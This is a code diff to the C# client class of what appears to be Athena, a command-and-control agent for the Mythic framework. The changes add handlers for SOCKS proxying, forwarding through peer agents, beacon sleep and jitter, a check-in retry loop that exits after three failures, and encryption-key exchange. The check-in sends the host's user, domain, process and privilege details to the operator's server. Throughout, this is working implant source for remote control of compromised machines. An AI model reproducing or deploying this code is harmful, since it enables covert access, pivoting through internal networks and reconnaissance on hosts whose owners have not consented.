@@ -10,17 +10,26 @@ using System.Diagnostics;
 using System.Net;
 using System.Threading.Tasks;
 using Athena.Commands;
+using Athena.Commands.Model;
+using PluginBase;
 
 namespace Athena
 {
     public class MythicClient
     {
+        public EventHandler SetSleep;
         public MythicConfig MythicConfig { get; set; }
         public CommandHandler commandHandler { get; set; }
+        public SocksHandler socksHandler { get; set; }
+
         public MythicClient()
         {
             this.MythicConfig = new MythicConfig();
             this.commandHandler = new CommandHandler();
+            this.socksHandler = new SocksHandler();
+            this.commandHandler.ActionSetSleepAndJitter = SetSleepAndJitter;
+            this.commandHandler.ActionStartForwarder = StartForwarder;
+            this.commandHandler.ActionStartSocks = StartSocks;
         }
 
         #region Communication Functions      
@@ -37,7 +46,7 @@ namespace Athena
                 user = Environment.UserName,
                 host = Dns.GetHostName(),
                 pid = Process.GetCurrentProcess().Id.ToString(),
-                uuid = this.MythicConfig.uuid,
+                uuid = MythicConfig.uuid,
                 architecture = await Misc.GetArch(),
                 domain = Environment.UserDomainName,
                 integrity_level = Misc.getIntegrity(),
@@ -66,6 +75,43 @@ namespace Athena
                 return new CheckinResponse();
             }
         }
+
+
+        private void SetSleepAndJitter(int[] sleepArgs)
+        {
+            this.MythicConfig.sleep = sleepArgs[0];
+            this.MythicConfig.jitter = sleepArgs[1];
+        }
+
+        private void StartForwarder(MythicJob job)
+        {
+            var res = MythicConfig.forwarder.Link(job).Result;
+            _ = commandHandler.AddResponse(res);
+        }
+
+        private void StartSocks(MythicJob job)
+        {
+            if (this.socksHandler.Start().Result)
+            {
+                this.commandHandler.AddResponse(new ResponseResult
+                {
+                    user_output = "Socks Started",
+                    completed = "true",
+                    task_id = job.task.id,
+                });
+            }
+            else
+            {
+                this.commandHandler.AddResponse(new ResponseResult
+                {
+                    user_output = "Failed to start socks",
+                    completed = "true",
+                    task_id = job.task.id,
+                    status = "error"
+                });
+            }
+        }
+
 
         /// <summary>
         /// Perform a get tasking action with the Mythic server to return current responses and check for new tasks
@@ -160,7 +206,7 @@ namespace Athena
         private async Task HandleSocks(List<SocksMessage> socks)
         {
             Task.Run(async() => Parallel.ForEach(socks, async (socks) => {
-                await Globals.socksHandler.HandleMessage(socks);
+                await this.socksHandler.HandleMessage(socks);
             }
             ));
         }
@@ -173,7 +219,7 @@ namespace Athena
         {
             Parallel.ForEach(delegates, async del =>
             {
-                await Globals.mc.MythicConfig.forwarder.ForwardDelegateMessage(del);
+                await this.MythicConfig.forwarder.ForwardDelegateMessage(del);
             });
         }
 
@@ -195,6 +241,71 @@ namespace Athena
                     await this.commandHandler.HandleDownloadPiece(response);
                 }
             });
+        }
+
+        /// <summary>
+        /// Perform initial checkin with the Mythic server
+        /// </summary>
+        public async Task<CheckinResponse> handleCheckin()
+        {
+            int maxMissedCheckins = 3;
+            int missedCheckins = 0;
+            CheckinResponse res = await this.CheckIn();
+
+            //Run in loop, just in case the agent is not able to connect initially to give a chance for network issues to resolve
+            while (res == null || res.status != "success")
+            {
+                //Attempt checkin again
+                try
+                {
+                    //Increment checkins
+                    missedCheckins += 1;
+
+                    if (missedCheckins == maxMissedCheckins)
+                    {
+                        //bye bye
+                        Environment.Exit(0);
+                    }
+
+                    //Keep Trying
+                    res = await this.CheckIn();
+                }
+                catch (Exception e)
+                {
+                }
+                //Sleep before attempting checkin again
+                await Task.Delay(await Misc.GetSleep(this.MythicConfig.sleep, this.MythicConfig.jitter) * 1000);
+            }
+            return res;
+        }
+
+        /// <summary>
+        /// Update the agent information on successful checkin with the Mythic server
+        /// </summary>
+        /// <param name="res">CheckIn Response</param>
+        public async Task<bool> updateAgentInfo(CheckinResponse res)
+        {
+            try
+            {
+                MythicConfig.uuid = res.id;
+
+                if (this.MythicConfig.currentConfig.encrypted)
+                {
+                    if (this.MythicConfig.currentConfig.encryptedExchangeCheck && !String.IsNullOrEmpty(res.encryption_key))
+                    {
+                        this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, res.encryption_key);
+                    }
+                    else
+                    {
+                        this.MythicConfig.currentConfig.crypt = new PSKCrypto(res.id, this.MythicConfig.currentConfig.psk);
+                    }
+                }
+                return true;
+            }
+            catch (Exception e)
+            {
+                return false;
+            }
         }
         #endregion
     }
